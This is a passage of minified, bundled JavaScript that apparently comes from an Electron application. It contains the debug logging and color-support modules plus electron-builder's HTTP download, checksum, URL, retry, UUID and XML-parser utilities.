          ]);
        function c() {
          if (
            typeof window < "u" &&
            window.process &&
            (window.process.type === "renderer" || window.process.__nwjs)
          )
            return !0;
          if (
            typeof navigator < "u" &&
            navigator.userAgent &&
            navigator.userAgent.toLowerCase().match(/(edge|trident)\/(\d+)/)
          )
            return !1;
          let e;
          return (
            (typeof document < "u" &&
              document.documentElement &&
              document.documentElement.style &&
              document.documentElement.style.WebkitAppearance) ||
            (typeof window < "u" &&
              window.console &&
              (window.console.firebug ||
                (window.console.exception && window.console.table))) ||
            (typeof navigator < "u" &&
              navigator.userAgent &&
              (e = navigator.userAgent.toLowerCase().match(/firefox\/(\d+)/)) &&
              parseInt(e[1], 10) >= 31) ||
            (typeof navigator < "u" &&
              navigator.userAgent &&
              navigator.userAgent.toLowerCase().match(/applewebkit\/(\d+)/))
          );
        }
        function h(e) {
          if (
            ((e[0] =
              (this.useColors ? "%c" : "") +
              this.namespace +
              (this.useColors ? " %c" : " ") +
              e[0] +
              (this.useColors ? "%c " : " ") +
              "+" +
              a.exports.humanize(this.diff)),
              !this.useColors)
          )
            return;
          const o = "color: " + this.color;
          e.splice(1, 0, o, "color: inherit");
          let n = 0,
            s = 0;
          e[0].replace(/%[a-zA-Z%]/g, (u) => {
            u !== "%%" && (n++, u === "%c" && (s = n));
          }),
            e.splice(s, 0, o);
        }
        i.log = console.debug || console.log || (() => { });
        function f(e) {
          try {
            e ? i.storage.setItem("debug", e) : i.storage.removeItem("debug");
          } catch { }
        }
        function t() {
          let e;
          try {
            e = i.storage.getItem("debug") || i.storage.getItem("DEBUG");
          } catch { }
          return (
            !e &&
            typeof process < "u" &&
            "env" in process &&
            (e = process.env.DEBUG),
            e
          );
        }
        function r() {
          try {
            return localStorage;
          } catch { }
        }
        a.exports = Rl()(i);
        const { formatters: l } = a.exports;
        l.j = function (e) {
          try {
            return JSON.stringify(e);
          } catch (o) {
            return "[UnexpectedJSONParseError]: " + o.message;
          }
        };
      })(Ur, Ur.exports)),
    Ur.exports
  );
}
var kr = { exports: {} },
  kn,
  Ba;
function Pf() {
  return (
    Ba ||
    ((Ba = 1),
      (kn = (a, i = process.argv) => {
        const c = a.startsWith("-") ? "" : a.length === 1 ? "-" : "--",
          h = i.indexOf(c + a),
          f = i.indexOf("--");
        return h !== -1 && (f === -1 || h < f);
      })),
    kn
  );
}
var qn, ja;
function Cf() {
  if (ja) return qn;
  ja = 1;
  const a = Ar,
    i = Sl,
    c = Pf(),
    { env: h } = process;
  let f;
  c("no-color") || c("no-colors") || c("color=false") || c("color=never")
    ? (f = 0)
    : (c("color") || c("colors") || c("color=true") || c("color=always")) &&
    (f = 1),
    "FORCE_COLOR" in h &&
    (h.FORCE_COLOR === "true"
      ? (f = 1)
      : h.FORCE_COLOR === "false"
        ? (f = 0)
        : (f =
          h.FORCE_COLOR.length === 0
            ? 1
            : Math.min(parseInt(h.FORCE_COLOR, 10), 3)));
  function t(e) {
    return e === 0
      ? !1
      : { level: e, hasBasic: !0, has256: e >= 2, has16m: e >= 3 };
  }
  function r(e, o) {
    if (f === 0) return 0;
    if (c("color=16m") || c("color=full") || c("color=truecolor")) return 3;
    if (c("color=256")) return 2;
    if (e && !o && f === void 0) return 0;
    const n = f || 0;
    if (h.TERM === "dumb") return n;
    if (process.platform === "win32") {
      const s = a.release().split(".");
      return Number(s[0]) >= 10 && Number(s[2]) >= 10586
        ? Number(s[2]) >= 14931
          ? 3
          : 2
        : 1;
    }
    if ("CI" in h)
      return [
        "TRAVIS",
        "CIRCLECI",
        "APPVEYOR",
        "GITLAB_CI",
        "GITHUB_ACTIONS",
        "BUILDKITE",
      ].some((s) => s in h) || h.CI_NAME === "codeship"
        ? 1
        : n;
    if ("TEAMCITY_VERSION" in h)
      return /^(9\.(0*[1-9]\d*)\.|\d{2,}\.)/.test(h.TEAMCITY_VERSION) ? 1 : 0;
    if (h.COLORTERM === "truecolor") return 3;
    if ("TERM_PROGRAM" in h) {
      const s = parseInt((h.TERM_PROGRAM_VERSION || "").split(".")[0], 10);
      switch (h.TERM_PROGRAM) {
        case "iTerm.app":
          return s >= 3 ? 3 : 2;
        case "Apple_Terminal":
          return 2;
      }
    }
    return /-256(color)?$/i.test(h.TERM)
      ? 2
      : /^screen|^xterm|^vt100|^vt220|^rxvt|color|ansi|cygwin|linux/i.test(
        h.TERM
      ) || "COLORTERM" in h
        ? 1
        : n;
  }
  function l(e) {
    const o = r(e, e && e.isTTY);
    return t(o);
  }
  return (
    (qn = {
      supportsColor: l,
      stdout: t(r(!0, i.isatty(1))),
      stderr: t(r(!0, i.isatty(2))),
    }),
    qn
  );
}
var Ha;
function If() {
  return (
    Ha ||
    ((Ha = 1),
      (function (a, i) {
        const c = Sl,
          h = Vr;
        (i.init = n),
          (i.log = l),
          (i.formatArgs = t),
          (i.save = e),
          (i.load = o),
          (i.useColors = f),
          (i.destroy = h.deprecate(() => { },
            "Instance method `debug.destroy()` is deprecated and no longer does anything. It will be removed in the next major version of `debug`.")),
          (i.colors = [6, 2, 3, 4, 5, 1]);
        try {
          const u = Cf();
          u &&
            (u.stderr || u).level >= 2 &&
            (i.colors = [
              20, 21, 26, 27, 32, 33, 38, 39, 40, 41, 42, 43, 44, 45, 56, 57,
              62, 63, 68, 69, 74, 75, 76, 77, 78, 79, 80, 81, 92, 93, 98, 99,
              112, 113, 128, 129, 134, 135, 148, 149, 160, 161, 162, 163, 164,
              165, 166, 167, 168, 169, 170, 171, 172, 173, 178, 179, 184, 185,
              196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208,
              209, 214, 215, 220, 221,
            ]);
        } catch { }
        i.inspectOpts = Object.keys(process.env)
          .filter((u) => /^debug_/i.test(u))
          .reduce((u, m) => {
            const E = m
              .substring(6)
              .toLowerCase()
              .replace(/_([a-z])/g, (p, A) => A.toUpperCase());
            let y = process.env[m];
            return (
              /^(yes|on|true|enabled)$/i.test(y)
                ? (y = !0)
                : /^(no|off|false|disabled)$/i.test(y)
                  ? (y = !1)
                  : y === "null"
                    ? (y = null)
                    : (y = Number(y)),
              (u[E] = y),
              u
            );
          }, {});
        function f() {
          return "colors" in i.inspectOpts
            ? !!i.inspectOpts.colors
            : c.isatty(process.stderr.fd);
        }
        function t(u) {
          const { namespace: m, useColors: E } = this;
          if (E) {
            const y = this.color,
              p = "\x1B[3" + (y < 8 ? y : "8;5;" + y),
              A = `  ${p};1m${m} \x1B[0m`;
            (u[0] =
              A +
              u[0]
                .split(
                  `
`
                )
                .join(
                  `
` + A
                )),
              u.push(p + "m+" + a.exports.humanize(this.diff) + "\x1B[0m");
          } else u[0] = r() + m + " " + u[0];
        }
        function r() {
          return i.inspectOpts.hideDate ? "" : new Date().toISOString() + " ";
        }
        function l(...u) {
          return process.stderr.write(
            h.formatWithOptions(i.inspectOpts, ...u) +
            `
`
          );
        }
        function e(u) {
          u ? (process.env.DEBUG = u) : delete process.env.DEBUG;
        }
        function o() {
          return process.env.DEBUG;
        }
        function n(u) {
          u.inspectOpts = {};
          const m = Object.keys(i.inspectOpts);
          for (let E = 0; E < m.length; E++)
            u.inspectOpts[m[E]] = i.inspectOpts[m[E]];
        }
        a.exports = Rl()(i);
        const { formatters: s } = a.exports;
        (s.o = function (u) {
          return (
            (this.inspectOpts.colors = this.useColors),
            h
              .inspect(u, this.inspectOpts)
              .split(
                `
`
              )
              .map((m) => m.trim())
              .join(" ")
          );
        }),
          (s.O = function (u) {
            return (
              (this.inspectOpts.colors = this.useColors),
              h.inspect(u, this.inspectOpts)
            );
          });
      })(kr, kr.exports)),
    kr.exports
  );
}
var Ga;
function Of() {
  return (
    Ga ||
    ((Ga = 1),
      typeof process > "u" ||
        process.type === "renderer" ||
        process.browser === !0 ||
        process.__nwjs
        ? (Lr.exports = Rf())
        : (Lr.exports = If())),
    Lr.exports
  );
}
var Qt = {},
  Va;
function Pl() {
  if (Va) return Qt;
  (Va = 1),
    Object.defineProperty(Qt, "__esModule", { value: !0 }),
    (Qt.ProgressCallbackTransform = void 0);
  const a = Ht;
  let i = class extends a.Transform {
    constructor(h, f, t) {
      super(),
        (this.total = h),
        (this.cancellationToken = f),
        (this.onProgress = t),
        (this.start = Date.now()),
        (this.transferred = 0),
        (this.delta = 0),
        (this.nextUpdate = this.start + 1e3);
    }
    _transform(h, f, t) {
      if (this.cancellationToken.cancelled) {
        t(new Error("cancelled"), null);
        return;
      }
      (this.transferred += h.length), (this.delta += h.length);
      const r = Date.now();
      r >= this.nextUpdate &&
        this.transferred !== this.total &&
        ((this.nextUpdate = r + 1e3),
          this.onProgress({
            total: this.total,
            delta: this.delta,
            transferred: this.transferred,
            percent: (this.transferred / this.total) * 100,
            bytesPerSecond: Math.round(
              this.transferred / ((r - this.start) / 1e3)
            ),
          }),
          (this.delta = 0)),
        t(null, h);
    }
    _flush(h) {
      if (this.cancellationToken.cancelled) {
        h(new Error("cancelled"));
        return;
      }
      this.onProgress({
        total: this.total,
        delta: this.delta,
        transferred: this.total,
        percent: 100,
        bytesPerSecond: Math.round(
          this.transferred / ((Date.now() - this.start) / 1e3)
        ),
      }),
        (this.delta = 0),
        h(null);
    }
  };
  return (Qt.ProgressCallbackTransform = i), Qt;
}
var Wa;
function Df() {
  if (Wa) return Ge;
  (Wa = 1),
    Object.defineProperty(Ge, "__esModule", { value: !0 }),
    (Ge.DigestTransform = Ge.HttpExecutor = Ge.HttpError = void 0),
    (Ge.createHttpError = o),
    (Ge.parseJson = u),
    (Ge.configureRequestOptionsFromUrl = E),
    (Ge.configureRequestUrl = y),
    (Ge.safeGetHeader = S),
    (Ge.configureRequestOptions = R),
    (Ge.safeStringifyJson = C);
  const a = _r,
    i = Of(),
    c = be,
    h = Ht,
    f = Gt,
    t = Oo(),
    r = zr(),
    l = Pl(),
    e = (0, i.default)("electron-builder");
  function o(v, w = null) {
    return new s(
      v.statusCode || -1,
      `${v.statusCode} ${v.statusMessage}` +
      (w == null
        ? ""
        : `
` + JSON.stringify(w, null, "  ")) +
      `
Headers: ` +
      C(v.headers),
      w
    );
  }
  const n = new Map([
    [429, "Too many requests"],
    [400, "Bad request"],
    [403, "Forbidden"],
    [404, "Not found"],
    [405, "Method not allowed"],
    [406, "Not acceptable"],
    [408, "Request timeout"],
    [413, "Request entity too large"],
    [500, "Internal server error"],
    [502, "Bad gateway"],
    [503, "Service unavailable"],
    [504, "Gateway timeout"],
    [505, "HTTP version not supported"],
  ]);
  class s extends Error {
    constructor(w, _ = `HTTP error: ${n.get(w) || w}`, g = null) {
      super(_),
        (this.statusCode = w),
        (this.description = g),
        (this.name = "HttpError"),
        (this.code = `HTTP_ERROR_${w}`);
    }
    isServerError() {
      return this.statusCode >= 500 && this.statusCode <= 599;
    }
  }
  Ge.HttpError = s;
  function u(v) {
    return v.then((w) => (w == null || w.length === 0 ? null : JSON.parse(w)));
  }
  class m {
    constructor() {
      this.maxRedirects = 10;
    }
    request(w, _ = new t.CancellationToken(), g) {
      R(w);
      const D = g == null ? void 0 : JSON.stringify(g),
        O = D ? Buffer.from(D) : void 0;
      if (O != null) {
        e(D);
        const { headers: N, ...L } = w;
        w = {
          method: "post",
          headers: {
            "Content-Type": "application/json",
            "Content-Length": O.length,
            ...N,
          },
          ...L,
        };
      }
      return this.doApiRequest(w, _, (N) => N.end(O));
    }
    doApiRequest(w, _, g, D = 0) {
      return (
        e.enabled && e(`Request: ${C(w)}`),
        _.createPromise((O, N, L) => {
          const F = this.createRequest(w, ($) => {
            try {
              this.handleResponse($, w, _, O, N, D, g);
            } catch (k) {
              N(k);
            }
          });
          this.addErrorAndTimeoutHandlers(F, N, w.timeout),
            this.addRedirectHandlers(F, w, N, D, ($) => {
              this.doApiRequest($, _, g, D).then(O).catch(N);
            }),
            g(F, N),
            L(() => F.abort());
        })
      );
    }
    addRedirectHandlers(w, _, g, D, O) { }
    addErrorAndTimeoutHandlers(w, _, g = 60 * 1e3) {
      this.addTimeOutHandler(w, _, g),
        w.on("error", _),
        w.on("aborted", () => {
          _(new Error("Request has been aborted by the server"));
        });
    }
    handleResponse(w, _, g, D, O, N, L) {
      var F;
      if (
        (e.enabled &&
          e(
            `Response: ${w.statusCode} ${w.statusMessage}, request options: ${C(
              _
            )}`
          ),
          w.statusCode === 404)
      ) {
        O(
          o(
            w,
            `method: ${_.method || "GET"} url: ${_.protocol || "https:"}//${_.hostname
            }${_.port ? `:${_.port}` : ""}${_.path}

Please double check that your authentication token is correct. Due to security reasons, actual status maybe not reported, but 404.
`
          )
        );
        return;
      } else if (w.statusCode === 204) {
        D();
        return;
      }
      const $ = (F = w.statusCode) !== null && F !== void 0 ? F : 0,
        k = $ >= 300 && $ < 400,
        M = S(w, "location");
      if (k && M != null) {
        if (N > this.maxRedirects) {
          O(this.createMaxRedirectError());
          return;
        }
        this.doApiRequest(m.prepareRedirectUrlOptions(M, _), g, L, N)
          .then(D)
          .catch(O);
        return;
      }
      w.setEncoding("utf8");
      let K = "";
      w.on("error", O),
        w.on("data", (G) => (K += G)),
        w.on("end", () => {
          try {
            if (w.statusCode != null && w.statusCode >= 400) {
              const G = S(w, "content-type"),
                ne =
                  G != null &&
                  (Array.isArray(G)
                    ? G.find((se) => se.includes("json")) != null
                    : G.includes("json"));
              O(
                o(
                  w,
                  `method: ${_.method || "GET"} url: ${_.protocol || "https:"
                  }//${_.hostname}${_.port ? `:${_.port}` : ""}${_.path}

          Data:
          ${ne ? JSON.stringify(JSON.parse(K)) : K}
          `
                )
              );
            } else D(K.length === 0 ? null : K);
          } catch (G) {
            O(G);
          }
        });
    }
    async downloadToBuffer(w, _) {
      return await _.cancellationToken.createPromise((g, D, O) => {
        const N = [],
          L = { headers: _.headers || void 0, redirect: "manual" };
        y(w, L),
          R(L),
          this.doDownload(
            L,
            {
              destination: null,
              options: _,
              onCancel: O,
              callback: (F) => {
                F == null ? g(Buffer.concat(N)) : D(F);
              },
              responseHandler: (F, $) => {
                let k = 0;
                F.on("data", (M) => {
                  if (((k += M.length), k > 524288e3)) {
                    $(new Error("Maximum allowed size is 500 MB"));
                    return;
                  }
                  N.push(M);
                }),
                  F.on("end", () => {
                    $(null);
                  });
              },
            },
            0
          );
      });
    }
    doDownload(w, _, g) {
      const D = this.createRequest(w, (O) => {
        if (O.statusCode >= 400) {
          _.callback(
            new Error(
              `Cannot download "${w.protocol || "https:"}//${w.hostname}${w.path
              }", status ${O.statusCode}: ${O.statusMessage}`
            )
          );
          return;
        }
        O.on("error", _.callback);
        const N = S(O, "location");
        if (N != null) {
          g < this.maxRedirects
            ? this.doDownload(m.prepareRedirectUrlOptions(N, w), _, g++)
            : _.callback(this.createMaxRedirectError());
          return;
        }
        _.responseHandler == null ? b(_, O) : _.responseHandler(O, _.callback);
      });
      this.addErrorAndTimeoutHandlers(D, _.callback, w.timeout),
        this.addRedirectHandlers(D, w, _.callback, g, (O) => {
          this.doDownload(O, _, g++);
        }),
        D.end();
    }
    createMaxRedirectError() {
      return new Error(`Too many redirects (> ${this.maxRedirects})`);
    }
    addTimeOutHandler(w, _, g) {
      w.on("socket", (D) => {
        D.setTimeout(g, () => {
          w.abort(), _(new Error("Request timed out"));
        });
      });
    }
    static prepareRedirectUrlOptions(w, _) {
      const g = E(w, { ..._ }),
        D = g.headers;
      if (D?.authorization) {
        const O = new f.URL(w);
        (O.hostname.endsWith(".amazonaws.com") ||
          O.searchParams.has("X-Amz-Credential")) &&
          delete D.authorization;
      }
      return g;
    }
    static retryOnServerError(w, _ = 3) {
      for (let g = 0; ; g++)
        try {
          return w();
        } catch (D) {
          if (
            g < _ &&
            ((D instanceof s && D.isServerError()) || D.code === "EPIPE")
          )
            continue;
          throw D;
        }
    }
  }
  Ge.HttpExecutor = m;
  function E(v, w) {
    const _ = R(w);
    return y(new f.URL(v), _), _;
  }
  function y(v, w) {
    (w.protocol = v.protocol),
      (w.hostname = v.hostname),
      v.port ? (w.port = v.port) : w.port && delete w.port,
      (w.path = v.pathname + v.search);
  }
  class p extends h.Transform {
    get actual() {
      return this._actual;
    }
    constructor(w, _ = "sha512", g = "base64") {
      super(),
        (this.expected = w),
        (this.algorithm = _),
        (this.encoding = g),
        (this._actual = null),
        (this.isValidateOnEnd = !0),
        (this.digester = (0, a.createHash)(_));
    }
    _transform(w, _, g) {
      this.digester.update(w), g(null, w);
    }
    _flush(w) {
      if (
        ((this._actual = this.digester.digest(this.encoding)),
          this.isValidateOnEnd)
      )
        try {
          this.validate();
        } catch (_) {
          w(_);
          return;
        }
      w(null);
    }
    validate() {
      if (this._actual == null)
        throw (0, r.newError)("Not finished yet", "ERR_STREAM_NOT_FINISHED");
      if (this._actual !== this.expected)
        throw (0, r.newError)(
          `${this.algorithm} checksum mismatch, expected ${this.expected}, got ${this._actual}`,
          "ERR_CHECKSUM_MISMATCH"
        );
      return null;
    }
  }
  Ge.DigestTransform = p;
  function A(v, w, _) {
    return v != null && w != null && v !== w
      ? (_(
        new Error(
          `checksum mismatch: expected ${w} but got ${v} (X-Checksum-Sha2 header)`
        )
      ),
        !1)
      : !0;
  }
  function S(v, w) {
    const _ = v.headers[w];
    return _ == null
      ? null
      : Array.isArray(_)
        ? _.length === 0
          ? null
          : _[_.length - 1]
        : _;
  }
  function b(v, w) {
    if (!A(S(w, "X-Checksum-Sha2"), v.options.sha2, v.callback)) return;
    const _ = [];
    if (v.options.onProgress != null) {
      const N = S(w, "content-length");
      N != null &&
        _.push(
          new l.ProgressCallbackTransform(
            parseInt(N, 10),
            v.options.cancellationToken,
            v.options.onProgress
          )
        );
    }
    const g = v.options.sha512;
    g != null
      ? _.push(
        new p(
          g,
          "sha512",
          g.length === 128 &&
            !g.includes("+") &&
            !g.includes("Z") &&
            !g.includes("=")
            ? "hex"
            : "base64"
        )
      )
      : v.options.sha2 != null &&
      _.push(new p(v.options.sha2, "sha256", "hex"));
    const D = (0, c.createWriteStream)(v.destination);
    _.push(D);
    let O = w;
    for (const N of _)
      N.on("error", (L) => {
        D.close(), v.options.cancellationToken.cancelled || v.callback(L);
      }),
        (O = O.pipe(N));
    D.on("finish", () => {
      D.close(v.callback);
    });
  }
  function R(v, w, _) {
    _ != null && (v.method = _), (v.headers = { ...v.headers });
    const g = v.headers;
    return (
      w != null &&
      (g.authorization =
        w.startsWith("Basic") || w.startsWith("Bearer") ? w : `token ${w}`),
      g["User-Agent"] == null && (g["User-Agent"] = "electron-builder"),
      (_ == null || _ === "GET" || g["Cache-Control"] == null) &&
      (g["Cache-Control"] = "no-cache"),
      v.protocol == null &&
      process.versions.electron != null &&
      (v.protocol = "https:"),
      v
    );
  }
  function C(v, w) {
    return JSON.stringify(
      v,
      (_, g) =>
        _.endsWith("Authorization") ||
          _.endsWith("authorization") ||
          _.endsWith("Password") ||
          _.endsWith("PASSWORD") ||
          _.endsWith("Token") ||
          _.includes("password") ||
          _.includes("token") ||
          (w != null && w.has(_))
          ? "<stripped sensitive data>"
          : g,
      2
    );
  }
  return Ge;
}
var Zt = {},
  za;
function xf() {
  if (za) return Zt;
  (za = 1),
    Object.defineProperty(Zt, "__esModule", { value: !0 }),
    (Zt.MemoLazy = void 0);
  let a = class {
    constructor(h, f) {
      (this.selector = h),
        (this.creator = f),
        (this.selected = void 0),
        (this._value = void 0);
    }
    get hasValue() {
      return this._value !== void 0;
    }
    get value() {
      const h = this.selector();
      if (this._value !== void 0 && i(this.selected, h)) return this._value;
      this.selected = h;
      const f = this.creator(h);
      return (this.value = f), f;
    }
    set value(h) {
      this._value = h;
    }
  };
  Zt.MemoLazy = a;
  function i(c, h) {
    if (
      typeof c == "object" &&
      c !== null &&
      typeof h == "object" &&
      h !== null
    ) {
      const r = Object.keys(c),
        l = Object.keys(h);
      return r.length === l.length && r.every((e) => i(c[e], h[e]));
    }
    return c === h;
  }
  return Zt;
}
var er = {},
  Ya;
function Nf() {
  if (Ya) return er;
  (Ya = 1),
    Object.defineProperty(er, "__esModule", { value: !0 }),
    (er.githubUrl = a),
    (er.getS3LikeProviderBaseUrl = i);
  function a(t, r = "github.com") {
    return `${t.protocol || "https"}://${t.host || r}`;
  }
  function i(t) {
    const r = t.provider;
    if (r === "s3") return c(t);
    if (r === "spaces") return f(t);
    throw new Error(`Not supported provider: ${r}`);
  }
  function c(t) {
    let r;
    if (t.accelerate == !0)
      r = `https://${t.bucket}.s3-accelerate.amazonaws.com`;
    else if (t.endpoint != null) r = `${t.endpoint}/${t.bucket}`;
    else if (t.bucket.includes(".")) {
      if (t.region == null)
        throw new Error(
          `Bucket name "${t.bucket}" includes a dot, but S3 region is missing`
        );
      t.region === "us-east-1"
        ? (r = `https://s3.amazonaws.com/${t.bucket}`)
        : (r = `https://s3-${t.region}.amazonaws.com/${t.bucket}`);
    } else
      t.region === "cn-north-1"
        ? (r = `https://${t.bucket}.s3.${t.region}.amazonaws.com.cn`)
        : (r = `https://${t.bucket}.s3.amazonaws.com`);
    return h(r, t.path);
  }
  function h(t, r) {
    return (
      r != null && r.length > 0 && (r.startsWith("/") || (t += "/"), (t += r)),
      t
    );
  }
  function f(t) {
    if (t.name == null) throw new Error("name is missing");
    if (t.region == null) throw new Error("region is missing");
    return h(`https://${t.name}.${t.region}.digitaloceanspaces.com`, t.path);
  }
  return er;
}
var qr = {},
  Ka;
function Ff() {
  if (Ka) return qr;
  (Ka = 1),
    Object.defineProperty(qr, "__esModule", { value: !0 }),
    (qr.retry = i);
  const a = Oo();
  async function i(c, h, f, t = 0, r = 0, l) {
    var e;
    const o = new a.CancellationToken();
    try {
      return await c();
    } catch (n) {
      if (
        (!((e = l?.(n)) !== null && e !== void 0) || e) &&
        h > 0 &&
        !o.cancelled
      )
        return (
          await new Promise((s) => setTimeout(s, f + t * r)),
          await i(c, h - 1, f, t, r + 1, l)
        );
      throw n;
    }
  }
  return qr;
}
var Mr = {},
  Xa;
function $f() {
  if (Xa) return Mr;
  (Xa = 1),
    Object.defineProperty(Mr, "__esModule", { value: !0 }),
    (Mr.parseDn = a);
  function a(i) {
    let c = !1,
      h = null,
      f = "",
      t = 0;
    i = i.trim();
    const r = new Map();
    for (let l = 0; l <= i.length; l++) {
      if (l === i.length) {
        h !== null && r.set(h, f);
        break;
      }
      const e = i[l];
      if (c) {
        if (e === '"') {
          c = !1;
          continue;
        }
      } else {
        if (e === '"') {
          c = !0;
          continue;
        }
        if (e === "\\") {
          l++;
          const o = parseInt(i.slice(l, l + 2), 16);
          Number.isNaN(o) ? (f += i[l]) : (l++, (f += String.fromCharCode(o)));
          continue;
        }
        if (h === null && e === "=") {
          (h = f), (f = "");
          continue;
        }
        if (e === "," || e === ";" || e === "+") {
          h !== null && r.set(h, f), (h = null), (f = "");
          continue;
        }
      }
      if (e === " " && !c) {
        if (f.length === 0) continue;
        if (l > t) {
          let o = l;
          for (; i[o] === " ";) o++;
          t = o;
        }
        if (
          t >= i.length ||
          i[t] === "," ||
          i[t] === ";" ||
          (h === null && i[t] === "=") ||
          (h !== null && i[t] === "+")
        ) {
          l = t - 1;
          continue;
        }
      }
      f += e;
    }
    return r;
  }
  return Mr;
}
var Ot = {},
  Ja;
function Lf() {
  if (Ja) return Ot;
  (Ja = 1),
    Object.defineProperty(Ot, "__esModule", { value: !0 }),
    (Ot.nil = Ot.UUID = void 0);
  const a = _r,
    i = zr(),
    c = "options.name must be either a string or a Buffer",
    h = (0, a.randomBytes)(16);
  h[0] = h[0] | 1;
  const f = {},
    t = [];
  for (let s = 0; s < 256; s++) {
    const u = (s + 256).toString(16).substr(1);
    (f[u] = s), (t[s] = u);
  }
  class r {
    constructor(u) {
      (this.ascii = null), (this.binary = null);
      const m = r.check(u);
      if (!m) throw new Error("not a UUID");
      (this.version = m.version),
        m.format === "ascii" ? (this.ascii = u) : (this.binary = u);
    }
    static v5(u, m) {
      return o(u, "sha1", 80, m);
    }
    toString() {
      return this.ascii == null && (this.ascii = n(this.binary)), this.ascii;
    }
    inspect() {
      return `UUID v${this.version} ${this.toString()}`;
    }
    static check(u, m = 0) {
      if (typeof u == "string")
        return (
          (u = u.toLowerCase()),
          /^[a-f0-9]{8}(-[a-f0-9]{4}){3}-([a-f0-9]{12})$/.test(u)
            ? u === "00000000-0000-0000-0000-000000000000"
              ? { version: void 0, variant: "nil", format: "ascii" }
              : {
                version: (f[u[14] + u[15]] & 240) >> 4,
                variant: l((f[u[19] + u[20]] & 224) >> 5),
                format: "ascii",
              }
            : !1
        );
      if (Buffer.isBuffer(u)) {
        if (u.length < m + 16) return !1;
        let E = 0;
        for (; E < 16 && u[m + E] === 0; E++);
        return E === 16
          ? { version: void 0, variant: "nil", format: "binary" }
          : {
            version: (u[m + 6] & 240) >> 4,
            variant: l((u[m + 8] & 224) >> 5),
            format: "binary",
          };
      }
      throw (0, i.newError)("Unknown type of uuid", "ERR_UNKNOWN_UUID_TYPE");
    }
    static parse(u) {
      const m = Buffer.allocUnsafe(16);
      let E = 0;
      for (let y = 0; y < 16; y++)
        (m[y] = f[u[E++] + u[E++]]),
          (y === 3 || y === 5 || y === 7 || y === 9) && (E += 1);
      return m;
    }
  }
  (Ot.UUID = r), (r.OID = r.parse("6ba7b812-9dad-11d1-80b4-00c04fd430c8"));
  function l(s) {
    switch (s) {
      case 0:
      case 1:
      case 3:
        return "ncs";
      case 4:
      case 5:
        return "rfc4122";
      case 6:
        return "microsoft";
      default:
        return "future";
    }
  }
  var e;
  (function (s) {
    (s[(s.ASCII = 0)] = "ASCII"),
      (s[(s.BINARY = 1)] = "BINARY"),
      (s[(s.OBJECT = 2)] = "OBJECT");
  })(e || (e = {}));
  function o(s, u, m, E, y = e.ASCII) {
    const p = (0, a.createHash)(u);
    if (typeof s != "string" && !Buffer.isBuffer(s))
      throw (0, i.newError)(c, "ERR_INVALID_UUID_NAME");
    p.update(E), p.update(s);
    const S = p.digest();
    let b;
    switch (y) {
      case e.BINARY:
        (S[6] = (S[6] & 15) | m), (S[8] = (S[8] & 63) | 128), (b = S);
        break;
      case e.OBJECT:
        (S[6] = (S[6] & 15) | m), (S[8] = (S[8] & 63) | 128), (b = new r(S));
        break;
      default:
        b =
          t[S[0]] +
          t[S[1]] +
          t[S[2]] +
          t[S[3]] +
          "-" +
          t[S[4]] +
          t[S[5]] +
          "-" +
          t[(S[6] & 15) | m] +
          t[S[7]] +
          "-" +
          t[(S[8] & 63) | 128] +
          t[S[9]] +
          "-" +
          t[S[10]] +
          t[S[11]] +
          t[S[12]] +
          t[S[13]] +
          t[S[14]] +
          t[S[15]];
        break;
    }
    return b;
  }
  function n(s) {
    return (
      t[s[0]] +
      t[s[1]] +
      t[s[2]] +
      t[s[3]] +
      "-" +
      t[s[4]] +
      t[s[5]] +
      "-" +
      t[s[6]] +
      t[s[7]] +
      "-" +
      t[s[8]] +
      t[s[9]] +
      "-" +
      t[s[10]] +
      t[s[11]] +
      t[s[12]] +
      t[s[13]] +
      t[s[14]] +
      t[s[15]]
    );
  }
  return (Ot.nil = new r("00000000-0000-0000-0000-000000000000")), Ot;
}
var qt = {},
  Mn = {},
  Qa;
function Uf() {
  return (
    Qa ||
    ((Qa = 1),
      (function (a) {
        (function (i) {
          (i.parser = function (I, T) {
            return new h(I, T);
          }),
            (i.SAXParser = h),
            (i.SAXStream = n),
            (i.createStream = o),
            (i.MAX_BUFFER_LENGTH = 64 * 1024);
          var c = [
            "comment",
            "sgmlDecl",
            "textNode",
            "tagName",
            "doctype",
            "procInstName",
            "procInstBody",
            "entity",
            "attribName",
            "attribValue",
            "cdata",
            "script",
          ];
          i.EVENTS = [
            "text",
            "processinginstruction",
            "sgmldeclaration",
            "doctype",
            "comment",
            "opentagstart",
            "attribute",
            "opentag",
            "closetag",
            "opencdata",
            "cdata",
            "closecdata",
            "error",
            "end",
            "ready",
            "script",
            "opennamespace",
            "closenamespace",
          ];
          function h(I, T) {
            if (!(this instanceof h)) return new h(I, T);
            var j = this;
            t(j),
              (j.q = j.c = ""),
              (j.bufferCheckPosition = i.MAX_BUFFER_LENGTH),
              (j.opt = T || {}),
              (j.opt.lowercase = j.opt.lowercase || j.opt.lowercasetags),
              (j.looseCase = j.opt.lowercase ? "toLowerCase" : "toUpperCase"),
              (j.tags = []),
              (j.closed = j.closedRoot = j.sawRoot = !1),
              (j.tag = j.error = null),
              (j.strict = !!I),
              (j.noscript = !!(I || j.opt.noscript)),
              (j.state = g.BEGIN),
              (j.strictEntities = j.opt.strictEntities),
              (j.ENTITIES = j.strictEntities
                ? Object.create(i.XML_ENTITIES)
                : Object.create(i.ENTITIES)),
              (j.attribList = []),
              j.opt.xmlns && (j.ns = Object.create(y)),
              j.opt.unquotedAttributeValues === void 0 &&
              (j.opt.unquotedAttributeValues = !I),
              (j.trackPosition = j.opt.position !== !1),
              j.trackPosition && (j.position = j.line = j.column = 0),
              O(j, "onready");
          }
          Object.create ||
            (Object.create = function (I) {
              function T() { }
              T.prototype = I;
              var j = new T();
              return j;
            }),
            Object.keys ||
            (Object.keys = function (I) {
              var T = [];
              for (var j in I) I.hasOwnProperty(j) && T.push(j);
              return T;
            });
          function f(I) {
            for (
              var T = Math.max(i.MAX_BUFFER_LENGTH, 10),
              j = 0,
              U = 0,
              le = c.length;
              U < le;
              U++
            ) {
              var ge = I[c[U]].length;
              if (ge > T)
                switch (c[U]) {
                  case "textNode":
                    L(I);
                    break;
                  case "cdata":
                    N(I, "oncdata", I.cdata), (I.cdata = "");
                    break;
                  case "script":
                    N(I, "onscript", I.script), (I.script = "");
                    break;
                  default:
                    $(I, "Max buffer length exceeded: " + c[U]);
                }
              j = Math.max(j, ge);
            }
            var me = i.MAX_BUFFER_LENGTH - j;
            I.bufferCheckPosition = me + I.position;
          }
          function t(I) {
            for (var T = 0, j = c.length; T < j; T++) I[c[T]] = "";
          }
          function r(I) {
            L(I),
